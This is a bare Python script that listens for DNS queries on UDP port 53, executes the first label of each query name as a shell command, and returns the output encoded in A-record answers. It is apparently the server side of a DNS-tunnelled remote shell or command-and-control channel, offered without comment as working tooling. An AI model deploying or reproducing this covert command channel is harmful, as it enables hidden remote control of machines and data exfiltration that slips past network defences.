#!/usr/bin/python3

import sys
import os
import socket
import subprocess
from message import *

serversocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

if(len(sys.argv) == 2):
    serversocket.bind((sys.argv[1], 53))
else:
    print("Argument error, socket bind on 127.0.0.1")
    serversocket.bind(("127.0.0.1",53))

last = ""
res = b'\x01\x01\x01\x01'
req_left = 0
req = 0

while True:
    data, ad = serversocket.recvfrom(4096)
    print(data)
    q = bytesToMessage(data)

    print(q)
    
    cmd = q.qList[0].qname.split(".")

    if(cmd[0] != "devtoplay"):
        if(last != cmd[0] and req_left == 0):
            last = cmd[0]
            i = 0
            while(cmd[0][i] >= "0" and cmd[0][i] <= "9"):
                i += 1
            print(cmd[0],last)

            if("cd" in cmd[0][i:]):
                os.chdir(cmd[0][i+3:])
                res=b''
            else:
                p = subprocess.Popen(cmd[0][i:], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
                res,err = p.communicate()

                if(res is None or res == b''):
                    res = err

                if(res is None):
                    res = b''
                
                res = len(res).to_bytes(1,'big') + res
                a = [RR(q.qList[0].qname,res[i:i+4], 1, 1, 1)
                     for i in range(0,len(res),4)]
                a.append(RR(q.qList[0].qname,b'\x00\x00\x00\x00', 1, 1, 1))
                print(a)
                req_left = len(a)
                req = 0

    if(req  < req_left):
        message = Message(Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0), q.qList, [a[req]])
        req += 1

        if(req == req_left):
            req_left = 0
    else:
        message = Message(Header(q.header.id, 1, 0, False, False, True, True, 0, 0, 1, 1, 0, 0), q.qList, [RR(q.qList[0].qname,b'\x01\x01\x01\x01', 1, 1, 1)])
        
    


    print(message)
    print(message.getBytes())
    serversocket.sendto(message.getBytes(), ad)
    print("end")
        
        
